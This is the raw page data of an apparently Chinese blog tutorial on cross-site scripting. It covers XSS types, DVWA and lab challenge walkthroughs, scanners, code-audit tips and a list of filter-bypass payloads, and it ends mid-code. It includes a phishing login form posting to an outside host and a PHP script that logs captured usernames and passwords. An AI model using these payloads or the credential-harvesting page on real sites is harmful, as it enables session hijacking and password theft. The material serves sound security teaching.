class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;option value=&quot;%3Cscript%3Ealert(%27xss%27)%3C/script%3E&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class=\"line\">&lt;/option&gt;`</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> script标签及值放在option标签内&lt;dom树执行结果&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"DVWA-Medium-1\"><a href=\"#DVWA-Medium-1\" class=\"headerlink\" title=\"DVWA-Medium\"></a>DVWA-Medium</h5><p>中级出现了对值&lt;script进行判断</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; Is there any input?</span><br><span class=\"line\">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123;</span><br><span class=\"line\">\t$default &#x3D; $_GET[&#39;default&#39;];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t# Do not allow script tags</span><br><span class=\"line\">\tif (stripos ($default, &quot;&lt;script&quot;) !&#x3D;&#x3D; false) &#123;</span><br><span class=\"line\">\t\theader (&quot;location: ?default&#x3D;English&quot;);</span><br><span class=\"line\">\t\texit;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 此时使用`&lt;img src=1 onerror=alert(1)&gt;`</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如下图所示，发现我们的语句被插入到了value值中，并没有插入到option标签的值中，所以img标签并没有发起任何作用。</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901145238002.png\" alt=\"image-20200901145238002\"></p>\n<p>构造语句闭合option标签：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(1)&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901145626304.png\" alt=\"image-20200901145626304\"></p>\n<p>&gt; 被插入到了option标签的值中，因为</option>闭合了option标签，所以img标签并没有插入;构造语句去闭合select标签</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 完成标签闭合完成</span></span><br><span class=\"line\">`&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#x27;xss&#x27;)&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901145826892.png\" alt=\"image-20200901145826892\"></p>\n<h5 id=\"DVWA-High\"><a href=\"#DVWA-High\" class=\"headerlink\" title=\"DVWA-High\"></a>DVWA-High</h5><p>先判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的相应值，如果不匹配，则插入的是默认的值。这样的话，语句就没有可能插入到页面中了。</p>\n<h3 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h3><h4 id=\"黑盒测试\"><a href=\"#黑盒测试\" class=\"headerlink\" title=\"黑盒测试\"></a>黑盒测试</h4><h5 id=\"AWVS\"><a href=\"#AWVS\" class=\"headerlink\" title=\"AWVS\"></a>AWVS</h5><p><img src=\"/images/XSS/image-20200831112823669.png\" alt=\"image-20200831112823669\"></p>\n<p>一款自动化扫描工具，主要利用爬虫形式对整个网站进行爬取后再进行内部payload测试。这样就可以检测网站是否存在XSS漏洞等。</p>\n<p>目前最新版本已经AWVS 13支持Web端配置如上图所示</p>\n<h5 id=\"BruteXSS\"><a href=\"#BruteXSS\" class=\"headerlink\" title=\"BruteXSS\"></a>BruteXSS</h5><p><a href=\"https://github.com/rajeshmajumdar/BruteXSS.git\">项目地址</a></p>\n<p><img src=\"/images/XSS/image-20200831111313145.png\" alt=\"image-20200831111313145\"></p>\n<p>BruteXSS 是一个非常强大和快速的跨站点脚本检测工具，可用于暴力注入参数。BruteXSS 从指定的词库加载多种有效载荷进行注入，并且使用指定的载荷和扫描检查这些存在 XSS 漏洞的参数。得益于非常强大的扫描功能，在执行任务时，BruteXSS 非常准确而且极少误报。 BruteXSS 支持 POST 和 GET 请求，并适应现代 Web 应用程序。</p>\n<p><strong>特点</strong></p>\n<ol>\n<li>XSS 爆破</li>\n<li>XSS 扫描</li>\n<li>GET/POST 请求</li>\n<li>可包含自定义单词</li>\n<li>人性化的 UI</li>\n</ol>\n<p>其它工具自行搜索，不过基于以上工具可基本满足平时测试和复现；其他工具网络搜索即可。</p>\n<h5 id=\"BeEF\"><a href=\"#BeEF\" class=\"headerlink\" title=\"BeEF\"></a>BeEF</h5><p>BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。</p>\n<p><img src=\"/images/XSS/logo.png\" alt=\"logo\"></p>\n<p>参考另一篇BeEF使用。</p>\n<h4 id=\"白盒测试\"><a href=\"#白盒测试\" class=\"headerlink\" title=\"白盒测试\"></a>白盒测试</h4><p>关于XSS的代码审计主要就是从<code>接收参数</code>和<code>输出函数</code>及一些关键词入手。</p>\n<p>PHP中常见<code>接收参数</code>的方式有：<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，</p>\n<p>PHP中常见<code>输出函数</code>的方式有：<code>print</code>，<code>print_r</code>，<code>echo</code>，<code>printf</code>，<code>sprintf</code>，<code>die</code>，<code>var_dump</code>，<code>var_export</code></p>\n<p>可以搜索<code>接收参数</code>的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p>\n<p>也可以搜索<code>输出函数</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p>\n<p>大多数程序会对接收参数封装在公共文件的函数中统一调用，就需要审计这些公共函数看有没有过滤，能否绕过等等。</p>\n<p>DOM型注入同样可以搜索一些JS操作DOM元素的关键词进行审计。</p>\n<h3 id=\"Bypass\"><a href=\"#Bypass\" class=\"headerlink\" title=\"Bypass\"></a>Bypass</h3><p>汇总部分绕过xss过滤方式，更多可搜“<code>XSS Filter Evasion Cheat Sheet_SecPulse</code>”一份专门介绍XSS的绕过。</p>\n<h4 id=\"大小写\"><a href=\"#大小写\" class=\"headerlink\" title=\"大小写\"></a>大小写</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;ScRIpT&gt;alert(&#x27;XSS&#x27;)&lt;/sCRIpT&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、十六进制编码</span><br><span class=\"line\">2、jsfuck编码</span><br><span class=\"line\">3、url编码</span><br><span class=\"line\">4、unicode编码等</span><br><span class=\"line\">5、`&lt;0x736372697074&gt;alert(&#x27;123&#x27;)&lt;/0x736372697074&gt;`</span><br><span class=\"line\">6、`&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"magic-quotes-gpc\"><a href=\"#magic-quotes-gpc\" class=\"headerlink\" title=\"magic_quotes_gpc\"></a>magic_quotes_gpc</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//绕过可参考以下</span><br><span class=\"line\">`&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"标签\"><a href=\"#标签\" class=\"headerlink\" title=\"标签\"></a>标签</h4><h5 id=\"闭合\"><a href=\"#闭合\" class=\"headerlink\" title=\"闭合\"></a>闭合</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//查看源码输出位置是否存在标签未闭合情况来进行绕过</span><br><span class=\"line\">`&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;`</span><br><span class=\"line\">`&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"其它标签\"><a href=\"#其它标签\" class=\"headerlink\" title=\"其它标签\"></a>其它标签</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用较多方式是通过报错形式来添加标签进行绕过</span><br><span class=\"line\">`&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;`</span><br><span class=\"line\">`&lt;button onclick=&quot;javascript:alert(&#x27;XSS&#x27;)&gt;XSS&lt;/button&quot;&gt;`</span><br><span class=\"line\">`&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;`</span><br><span class=\"line\">`&quot;onsubmit=javascript:alert(1)%20name=&quot;a`</span><br><span class=\"line\">`&lt;details open ontoggle=&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))&quot;&gt;`</span><br><span class=\"line\">`&lt;video src=&quot;http://www.0dutv.com/plug/down/up2.php/104678898.mp3&quot; onprogress=(&#x27;body&#x27;).perpend(123);(&#x27;body&#x27;)&gt;&lt;/video&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"替换\"><a href=\"#替换\" class=\"headerlink\" title=\"替换\"></a>替换</h4><table>\n<thead>\n<tr>\n<th>符号</th>\n<th>替换</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%0a</td>\n<td>替换空格</td>\n</tr>\n<tr>\n<td>%d</td>\n<td>替换空格</td>\n</tr>\n<tr>\n<td>/**/</td>\n<td>替换空格</td>\n</tr>\n<tr>\n<td>%00</td>\n<td>截断</td>\n</tr>\n<tr>\n<td>``</td>\n<td>替换括号</td>\n</tr>\n</tbody></table>\n<h4 id=\"重复绕过\"><a href=\"#重复绕过\" class=\"headerlink\" title=\"重复绕过\"></a>重复绕过</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//对部分字符过滤及替换时，采用重复形式进行绕过</span><br><span class=\"line\">`&lt;img ononerrorerror=&quot;123&quot;&gt;`</span><br><span class=\"line\">`&lt;script&gt;alalertert(123)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"宽子节绕过\"><a href=\"#宽子节绕过\" class=\"headerlink\" title=\"宽子节绕过\"></a>宽子节绕过</h4><p><code>GB系列</code>编码，尝试宽字节字符：</p>\n<p> <code>%c0</code>、<code>%bf</code>、<code>%5c</code>、<code>%df</code></p>\n<h4 id=\"事件属性\"><a href=\"#事件属性\" class=\"headerlink\" title=\"事件属性\"></a>事件属性</h4><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>解析</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>onclick</td>\n<td>鼠标点击事件</td>\n</tr>\n<tr>\n<td>onerror</td>\n<td>当加载文档或图像时发生某个错误</td>\n</tr>\n<tr>\n<td>onload</td>\n<td>某个页面或图像被完成加载</td>\n</tr>\n<tr>\n<td>onmousemove</td>\n<td>鼠标被移动</td>\n</tr>\n<tr>\n<td>等其它事件</td>\n<td></td>\n</tr>\n</tbody></table>\n<h4 id=\"长度限制\"><a href=\"#长度限制\" class=\"headerlink\" title=\"长度限制\"></a>长度限制</h4><p>input标签中有maxlength限制传参长度，抓包修改发送数据。</p>\n<h4 id=\"PHP部分函数\"><a href=\"#PHP部分函数\" class=\"headerlink\" title=\"PHP部分函数\"></a>PHP部分函数</h4><p>php内包含部分过滤及转义函数及绕过方式统计</p>\n<table>\n<thead>\n<tr>\n<th>序号</th>\n<th>PHP函数</th>\n<th>函数解析</th>\n<th>绕过</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>str_replace()</td>\n<td>该函数区分大小写</td>\n<td>使用大小写进行绕过</td>\n</tr>\n<tr>\n<td>2</td>\n<td>str_ireplace()</td>\n<td>该函数不区分大小写</td>\n<td>双写绕过，如：<scscriptirpt></td>\n</tr>\n<tr>\n<td>3</td>\n<td>preg_replace()</td>\n<td>正则表达式的搜索和替换</td>\n<td>使用html标签事件绕过，如：<code>&lt;img src=xx onerror=alert(1)&gt;</code></td>\n</tr>\n<tr>\n<td>4</td>\n<td>htmlentities()</td>\n<td>将字符转换为 HTML 转义字符</td>\n<td>htmlentities(string,quotestyle,character-set)函数的参数二，<br />默认情况下，是不对单引号进行编码的，仍可以用事件来触发XSS</td>\n</tr>\n</tbody></table>\n<h3 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h3><p>不管是反射型、存储型还是DOM型XSS可对外部提交的参数进行过滤及转义操作将达到简单防护功效；</p>\n<center>学习～</center>\n### 参考\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//反射型挑战解析</span><br><span class=\"line\">https://my.oschina.net/u/4332632/blog/3374751</span><br><span class=\"line\">https://www.cnblogs.com/bmjoker/p/9446472.html</span><br><span class=\"line\">bypass姿势</span><br><span class=\"line\">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</span><br><span class=\"line\">https://xz.aliyun.com/t/1678/</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h3><p>XSS：“Cross Site Scripting”：“跨站脚本攻击”，因和CSS（层叠样式表重名），因此被命名为XSS来表示”跨站脚本攻击”。</p>\n<p>之前说到，既然出现安全问题，必然是外部用户输入恶意字符串而产生的（又可称为：攻击者对参数、输入点可控，同时服务器端对输入的值未经过滤、转义，导致攻击事件发生。）整体的安全事件必然也均这样的经过，漏洞如何<code>验证</code>、<code>影响范围</code>及<code>修复</code>需要我们慢慢学习整理。</p>\n<h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>因浏览器本身设计缺陷，而浏览器的主要工作是对用户请求的HTML+CSS+Javascript的解释执行，其以前部分浏览器在安全性这块并未做任何验证，导致服务器端对外提供访问后一旦部署相应应用系统，且未对用户提交数据进行过滤将产生XSS攻击。</p>\n<p>本质是客户端代码注入攻击，代码类型基本属于前端类：HTML、Javascript、CSS等其他脚本组成。</p>\n<h4 id=\"产生过程\"><a href=\"#产生过程\" class=\"headerlink\" title=\"产生过程\"></a>产生过程</h4><h5 id=\"反射型-非持久性\"><a href=\"#反射型-非持久性\" class=\"headerlink\" title=\"反射型(非持久性)\"></a>反射型(非持久性)</h5><ol>\n<li>攻击者构造出特殊代码，其中包含恶意代码</li>\n<li>用户打开带有恶意代码URL或网页，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器</li>\n<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；会进行弹窗告警</li>\n</ol>\n<h5 id=\"存储型-持久性\"><a href=\"#存储型-持久性\" class=\"headerlink\" title=\"存储型(持久性)\"></a>存储型(持久性)</h5><ol>\n<li>攻击者准备好接收Cookie平台</li>\n<li>攻击者找到目标系统可留言、修改个人信息处</li>\n<li>插入恶意代码及链接</li>\n<li>管理员登录系统并对留言信息点击后会触发XSS漏洞</li>\n<li>会把管理员登录的Cookie发送到接收平台</li>\n<li>攻击者替换Cookie值进行访问，此时权限会提升至管理员</li>\n</ol>\n<h5 id=\"DOM型\"><a href=\"#DOM型\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h5><ol>\n<li>攻击者构造Javascript或其他脚本</li>\n<li>插入到指定位置(URL参数、其他个人信息或其他可修改位置)</li>\n<li>点击触发漏洞，构造的恶意代码被执行</li>\n<li>结果：可能会弹窗或其他操作</li>\n</ol>\n<h4 id=\"漏洞分类\"><a href=\"#漏洞分类\" class=\"headerlink\" title=\"漏洞分类\"></a>漏洞分类</h4><p>由以上了解，漏洞可按照以下形式进行分类：</p>\n<h5 id=\"一、非持久型-反射型、DOM型\"><a href=\"#一、非持久型-反射型、DOM型\" class=\"headerlink\" title=\"一、非持久型(反射型、DOM型)\"></a>一、非持久型(反射型、DOM型)</h5><p>指不会一直影响系统，只有每次点击访问后会触发浏览器执行对应恶意代码并作出响应。</p>\n<h5 id=\"二、持久型-存储型\"><a href=\"#二、持久型-存储型\" class=\"headerlink\" title=\"二、持久型(存储型)\"></a>二、持久型(存储型)</h5><p>指会一直留存于对应应用系统内，且如不删除操作会预留至系统内；一旦点击后会触发恶意代码，而且如不删除会每次点击都会触发。</p>\n<h3 id=\"漏洞环境\"><a href=\"#漏洞环境\" class=\"headerlink\" title=\"漏洞环境\"></a>漏洞环境</h3><p>值得推荐的本地漏洞环境可参考如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DVWA:https:&#x2F;&#x2F;github.com&#x2F;digininja&#x2F;DVWA.git</span><br><span class=\"line\">本地搭建XSS:https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;54041627</span><br><span class=\"line\">bwapp:http:&#x2F;&#x2F;www.itsecgames.com&#x2F;</span><br><span class=\"line\">其他环境待更新...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"在线挑战\"><a href=\"#在线挑战\" class=\"headerlink\" title=\"在线挑战\"></a>在线挑战</h3><p>值得推荐的线上挑战赛：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2296</span><br><span class=\"line\">https:&#x2F;&#x2F;xss-quiz.int21h.jp&#x2F;</span><br><span class=\"line\">其他环境待更新...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h3><p>按不同类型分析对目标系统会产生哪些影响范围</p>\n<h4 id=\"反射型\"><a href=\"#反射型\" class=\"headerlink\" title=\"反射型\"></a>反射型</h4><p>Cookie欺骗/Cookie会话攻击（提前搭建接收Cookie文件）</p>\n<p>XSS History Hack(利用：getComputedStyle()方法)</p>\n<h4 id=\"存储型\"><a href=\"#存储型\" class=\"headerlink\" title=\"存储型\"></a>存储型</h4><p>Cookie欺骗/Cookie会话攻击</p>\n<p>会话劫持(Session/Cookie)</p>\n<p>网络钓鱼</p>\n<p>钓鱼脚本</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://xss-lab.me:8888/get.php&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;test&quot;</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Pass&quot;</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;login&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>记录信息</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$data =fopen(<span class=\"string\">&#x27;login.txt&#x27;</span>,<span class=\"string\">&quot;a+&quot;</span>);</span><br><span class=\"line\">$login = $_POST[<span class=\"string\">&quot;username&quot;</span>];</span><br><span class=\"line\">$pass = $_POST[<span class=\"string\">&quot;password&quot;</span>];</span><br><span class=\"line\">fwrite($data,<span class=\"string\">&quot;username:<span class=\"subst\">$login</span>\\n&quot;</span>);</span><br><span class=\"line\">fwrite($data,<span class=\"string\">&quot;password:<span class=\"subst\">$pass</span>\\n&quot;</span>);</span><br><span class=\"line\">fclose($data);</span><br><span class=\"line\">Header(<span class=\"string\">&quot;location:login.html&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>下图记录用户提交请求</p>\n<p><img src=\"/images/XSS/image-20200828105754440.png\" alt=\"image-20200828105754440\"></p>\n<p>网页挂马(网页内嵌入script、或iframe等标签)</p>\n<p>DOS或DDOS</p>\n<h4 id=\"DOM型-1\"><a href=\"#DOM型-1\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h4><p>DOM型和反射型XSS类似因此不再重复写</p>\n<h3 id=\"实战验证\"><a href=\"#实战验证\" class=\"headerlink\" title=\"实战验证\"></a>实战验证</h3><h4 id=\"反射型-1\"><a href=\"#反射型-1\" class=\"headerlink\" title=\"反射型\"></a>反射型</h4><p>反射型XSS使用网络检索得到一款源码搭建本地测试，反射型<code>payload</code></p>\n<h5 id=\"挑战一\"><a href=\"#挑战一\" class=\"headerlink\" title=\"挑战一\"></a>挑战一</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//未编码</span><br><span class=\"line\">`&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">//外部输入变量</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\">str = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;name&quot;</span>];</span></span><br><span class=\"line\">//变量值未经过滤直接输出</span><br><span class=\"line\">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828134439412.png\" alt=\"image-20200828134439412\"></p>\n<h5 id=\"挑战二\"><a href=\"#挑战二\" class=\"headerlink\" title=\"挑战二\"></a>挑战二</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//初步测试,发现payload直接输出</span><br><span class=\"line\">`&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828140956492.png\" alt=\"image-20200828140956492\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//满足闭合,观察输入payload时输出</span><br><span class=\"line\">`&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//对变量经过htmlspecialchars函数过滤</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_et(&quot;display_errors&quot;, 0);</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\">str = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>];</span></span><br><span class=\"line\">echo &quot;&lt;h2 